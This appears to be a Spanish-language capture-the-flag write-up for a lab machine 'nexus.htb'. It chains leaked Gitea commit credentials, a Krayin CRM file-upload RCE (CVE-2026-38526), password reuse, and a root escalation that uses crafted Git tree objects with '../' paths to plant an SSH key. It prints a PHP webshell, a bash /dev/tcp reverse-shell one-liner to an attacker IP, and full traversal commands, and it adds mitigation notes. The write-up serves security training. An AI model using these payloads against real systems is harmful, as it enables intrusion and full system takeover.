
**IP:** 10.129.234.54 **SO:** Linux (TTL 64) **Dificultad:** Easy/Medium

## Resumen del ataque

1. Descubrimiento de vhosts (`git.nexus.htb`, `billing.nexus.htb`) mediante fuzzing con `ffuf`.
2. Filtración de un usuario (`j.matthew`) en el código fuente de la landing page principal.
3. Repositorio público en Gitea (`admin/krayin-docker-setup`) con credenciales de base de datos expuestas en el historial de commits.
4. Acceso al panel de administración de **Krayin CRM v2.2.0** reutilizando esas credenciales.
5. Explotación de **CVE-2026-38526** (RCE autenticada por subida de archivo sin restricción en `/admin/tinymce/upload`) → shell como `www-data`.
6. Reutilización de contraseña del `.env` de producción para escalar a usuario `jones` vía `su`.
7. Escalada a `root` explotando un path traversal en un servicio de sincronización de templates de Gitea (`gitea-template-sync.service`, ejecutado por systemd como root), construyendo manualmente objetos Git para plantar una clave SSH en `/root/.ssh/authorized_keys`.

---

## 1. Reconocimiento

### 1.1 Escaneo de puertos

```bash
nmap -sC -sV -p- 10.129.234.54
```

Resultado relevante:

```
22/tcp   open  ssh
80/tcp   open  http
```

El TTL de 64 en las respuestas confirma un sistema Linux.

Nmap detectó un nombre de dominio asociado al servidor web (vía `http-title` o certificado), por lo que fue necesario agregarlo al `/etc/hosts`:

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

### 1.2 Enumeración web inicial

Al navegar a `http://nexus.htb` se encontró una landing page sin elementos obviamente vulnerables a simple vista. Sin embargo, al revisar el código fuente (`view-source:`), se encontró un correo institucional:

```html
<p class="hiring-manager">Questions? Reach out to our hiring manager: <a href="mailto:j.matthew@nexus.htb">j.matthew@nexus.htb</a></p>
```

Esto reveló el patrón de nombre de usuario del dominio: **`j.matthew`** (inicial del nombre + punto + apellido).

### 1.3 Fuzzing de subdominios (vhosts)

Dado que el servidor dependía de un Host header específico, se realizó fuzzing de vhosts:

```bash
ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -fl 8 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Resultados relevantes:

```
billing   [Status: 302, Size: 0]
git       [Status: 200, Size: 14474]
```

Se agregaron ambos al `/etc/hosts`:

```bash
echo "10.129.234.54 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

- **`git.nexus.htb`** → Instancia de **Gitea v1.26.0**.
- **`billing.nexus.htb`** → Panel de administración de **Krayin CRM** (`/admin/login`), basado en Laravel. Se observó en la interfaz un warning de debug de Laravel filtrando la ruta interna `/var/www/krayin/...`, confirmando la ruta de instalación del CRM.

---

## 2. Explotación de Gitea - Filtración de credenciales

Se intentó el registro de un nuevo usuario en Gitea (`/user/sign_up`), pero estaba deshabilitado. Sin embargo, el repositorio `admin/krayin-docker-setup` resultó ser **público y clonable sin autenticación**:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
git log --oneline
```

```
9b817fa (HEAD -> main, origin/main, origin/HEAD) Upload files to "/"
1615c46 Upload files to "/"
```

Revisando el diff entre commits, se encontró que un archivo `.env` había sido subido con credenciales de base de datos, y luego "corregido" en un commit posterior (pero quedando visible en el historial):

```bash
git show 9b817fa
```

```diff
diff --git a/.env b/.env
@@ -2,7 +2,7 @@ APP_NAME='Krayin CRM'
 APP_ENV=local
 APP_KEY=
 APP_DEBUG=true
-APP_URL=http://nexus.htb
+APP_URL=http://billing.nexus.htb
 ...
 DB_USERNAME=krayin
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

**Credenciales filtradas:**

- Usuario: `j.matthew@nexus.htb`
- Contraseña: `N27xh!!2ucY04`

### Mitigación

- Nunca subir archivos `.env` (o cualquier archivo de configuración con secretos) a un repositorio de control de versiones, ni siquiera de forma temporal.
- Rotar cualquier credencial que haya sido expuesta en el historial de Git, incluso si fue "removida" en un commit posterior — el historial completo sigue siendo accesible.
- Restringir la visibilidad de repositorios internos/sensibles en Gitea.
- Usar herramientas de detección de secretos (`gitleaks`, `trufflehog`) en pipelines de CI antes de permitir un push.

---

## 3. Acceso al panel de Krayin CRM

Con las credenciales filtradas, se accedió exitosamente al panel de administración:

```
URL: http://billing.nexus.htb/admin/login
Usuario: j.matthew@nexus.htb
Contraseña: N27xh!!2ucY04
```

Se confirmó la versión exacta desde el menú de usuario del panel: **Krayin CRM v2.2.0**.

---

## 4. RCE vía CVE-2026-38526

### 4.1 Descripción de la vulnerabilidad

**CVE-2026-38526** es una vulnerabilidad crítica (CVSS 9.9) de subida de archivos sin restricción (CWE-434) en Krayin CRM v2.2.x. El endpoint `/admin/tinymce/upload`, utilizado por el editor de texto enriquecido TinyMCE, no valida correctamente el tipo/extensión de los archivos subidos, permitiendo a un atacante autenticado subir un archivo `.php` malicioso. El archivo queda accesible públicamente en `/storage/tinymce/`, por lo que una petición GET posterior ejecuta el código PHP arbitrario.

### 4.2 Explotación

Se utilizó un exploit público (Exploit-DB #52629) que automatiza el flujo de login + subida:

```python
# exploit.py (resumen de la lógica)
# 1. GET /admin/login -> extrae token CSRF
# 2. POST /admin/login con credenciales -> obtiene cookie de sesión + XSRF-TOKEN
# 3. POST /admin/tinymce/upload con un archivo PHP disfrazado de imagen
```

Webshell utilizada:

```php
<?php system($_GET['cmd']); ?>
```

Ejecución del exploit:

```bash
python3 exploit.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f shell.php
```

```
[+] File uploaded successfully.
Path to file: http://billing.nexus.htb/storage/tinymce/19bb6a816141eedc2452c79b8140fa49.php
```

**Nota técnica:** la contraseña contiene el carácter `!!`, lo que provoca _history expansion_ de bash en shells interactivas incluso dentro de comillas simples. Fue necesario ejecutar `set +H` antes de cada comando que incluyera la contraseña en texto plano, para evitar que bash la corrompiera antes de pasarla al script.

### 4.3 Confirmación de RCE

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/19bb6a816141eedc2452c79b8140fa49.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.4 Reverse shell

```bash
# Listener
nc -lvnp 4444
```

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/19bb6a816141eedc2452c79b8140fa49.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.225/4444 0>&1'" -G
```

Shell obtenida como `www-data`. Estabilización:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Mitigación

- Actualizar Krayin CRM a una versión parcheada.
- Implementar validación estricta de extensión y contenido (magic bytes) en todos los endpoints de subida de archivos.
- Configurar el servidor web para no ejecutar PHP en directorios de almacenamiento de uploads (`/storage/`).
- Aplicar el principio de menor privilegio al usuario del servicio web (`www-data`).

---

## 5. Escalada de privilegios: www-data → jones

### 5.1 Reutilización de credenciales

Con acceso al sistema, se localizó el archivo `.env` de producción real (distinto al del repositorio Git):

```bash
cat /var/www/krayin/.env
```

```
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

Esta contraseña es distinta a la filtrada en el repositorio (que había sido rotada), pero se probó por reutilización contra el único usuario con shell interactiva del sistema:

```bash
cat /etc/passwd | grep -v nologin
```

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

```bash
su jones
Password: y27xb3ha!!74GbR
```

Acceso exitoso — **contraseña reutilizada entre la base de datos de producción y la cuenta de sistema de `jones`**.

### Mitigación

- No reutilizar contraseñas entre distintos servicios/cuentas.
- Rotar credenciales de base de datos de forma periódica e independiente de las credenciales de usuarios del sistema.

---

## 6. Escalada de privilegios: jones → root

### 6.1 Enumeración

`sudo -l` no reveló privilegios para `jones`. No se encontraron binarios SUID inusuales ni capabilities relevantes. Sin embargo, se identificó un servicio systemd de sincronización de templates de Gitea:

```bash
find / -iname "*template*sync*" 2>/dev/null
```

```
/var/log/template-sync.log
/etc/gitea/template-sync.conf
/etc/gitea/template-sync.py
/etc/systemd/system/gitea-template-sync.timer
/etc/systemd/system/gitea-template-sync.service
```

```bash
cat /etc/systemd/system/gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

El servicio corre **como root**, disparado periódicamente por un timer de systemd (~60s).

### 6.2 Análisis de la vulnerabilidad

El script `/etc/gitea/template-sync.py`:

1. Se autentica en la API de Gitea con un token propio.
2. Busca repositorios marcados como `template: true`.
3. Por cada repo template, lee su árbol de archivos (`git ls-tree -r HEAD`) y extrae cada blob a un directorio de staging:

```python
target = os.path.join(stage_path, filepath)
...
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

El valor de `filepath` proviene directamente del árbol Git **sin ningún tipo de sanitización**. `os.path.join()` en Python, al recibir un componente que empieza con `../`, permite escapar completamente del directorio base (`stage_path`). Como el proceso corre como root, esto permite **escritura arbitraria de archivos en cualquier ruta del sistema**.

### 6.3 Explotación

**Paso 1 — Generar un par de claves SSH:**

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N ''
```

**Paso 2 — Autenticarse en la API de Gitea y generar un token:**

```bash
set +H  # evitar corrupción de la contraseña por el carácter !!

curl -s -X POST http://localhost:3000/api/v1/users/jones/tokens \
  -u "jones:y27xb3ha!!74GbR" \
  -H "Content-Type: application/json" \
  -d '{"name":"tok1","scopes":["write:repository","write:user"]}'
```

**Paso 3 — Crear un repositorio y marcarlo como template:**

```bash
TOKEN="<sha1_del_token>"

curl -s -X POST http://localhost:3000/api/v1/user/repos \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwn","private":false}'

curl -s -X PATCH http://localhost:3000/api/v1/repos/jones/pwn \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":true}'
```

**Paso 4 — Construir manualmente los objetos Git para el path traversal.**

Como `mkdir` con rutas `../../../` a nivel de filesystem local falla por permisos (jones no puede escribir en `/root`), se construyó el árbol de Git directamente con `git hash-object` y `git mktree`, sin necesidad de tocar el filesystem real. Git no valida el contenido de los nombres de archivo dentro de sus objetos tree, esa validación normalmente ocurre al hacer _checkout_ (paso que nunca se ejecuta en este ataque):

```bash
cd /tmp/rce_exploit
git init -b main

# Blob con la clave pública
blob=$(git hash-object -w /tmp/mykey.pub)

# Construcción del árbol anidado: root/.ssh/authorized_keys
t1=$(printf "100644 blob $blob\tauthorized_keys\n" | git mktree)
t2=$(printf "040000 tree $t1\t.ssh\n" | git mktree)
t3=$(printf "040000 tree $t2\troot\n" | git mktree)

# 5 niveles de ".." para escapar del directorio de staging
# (/home/git/template-staging/jones/pwn -> 5 niveles hasta "/")
t4=$(printf "040000 tree $t3\t..\n" | git mktree)
t5=$(printf "040000 tree $t4\t..\n" | git mktree)
t6=$(printf "040000 tree $t5\t..\n" | git mktree)
t7=$(printf "040000 tree $t6\t..\n" | git mktree)
t8=$(printf "040000 tree $t7\t..\n" | git mktree)

commit=$(git commit-tree $t8 -m "sync")
git update-ref refs/heads/main $commit
```

Verificación de la ruta resultante:

```bash
git ls-tree -r HEAD
```

```
100644 blob 14269e3aee64898240b8be15a24f48221d0cd4d  ../../../../../root/.ssh/authorized_keys
```

**Paso 5 — Push al repositorio template:**

```bash
git remote add origin http://localhost:3000/jones/pwn.git
git -c http.extraHeader="Authorization: token $TOKEN" push -u origin main --force
```

**Paso 6 — Esperar el ciclo del timer (~60s) y verificar:**

```bash
sleep 65
tail -20 /var/log/template-sync.log
```

**Paso 7 — Conectarse como root vía SSH con la clave plantada:**

```bash
ssh -i /tmp/mykey -o StrictHostKeyChecking=no root@localhost
```

```
root@nexus:~# whoami
root
```

### Mitigación

- Nunca extraer archivos de un repositorio Git no confiable sin sanitizar los paths (usar `os.path.normpath()` + verificar explícitamente que el resultado permanezca dentro del directorio base esperado, comparando rutas absolutas resueltas).
- No ejecutar servicios automatizados con privilegios de root si pueden ser disparados o influenciados por usuarios de menor privilegio (en este caso, cualquier usuario con cuenta en Gitea podía crear un repo template).
- Aplicar el principio de menor privilegio: el servicio de sync de templates no necesita correr como root.
- Auditar y firmar/validar el contenido de repositorios antes de procesarlos automáticamente.

---

## 7. Flags

```
user.txt: (agregar aquí si se capturó)
root.txt: 4fe564445eb3a203f23a61a12cf8723d
```

---

## 8. Resumen de la cadena de ataque

|Fase|Técnica|Resultado|
|---|---|---|
|Recon|Fuzzing de vhosts|Descubrimiento de `git.nexus.htb`, `billing.nexus.htb`|
|Recon|Revisión de código fuente|Usuario `j.matthew` filtrado|
|Acceso inicial|Clonado de repo público en Gitea|Credenciales en historial de Git|
|Acceso a app|Login con credenciales filtradas|Acceso admin a Krayin CRM|
|RCE|CVE-2026-38526 (upload sin restricción)|Shell como `www-data`|
|Escalada 1|Reutilización de contraseña (.env producción)|Shell como `jones`|
|Escalada 2|Path traversal en servicio systemd (root) vía objetos Git manuales|Shell como `root`|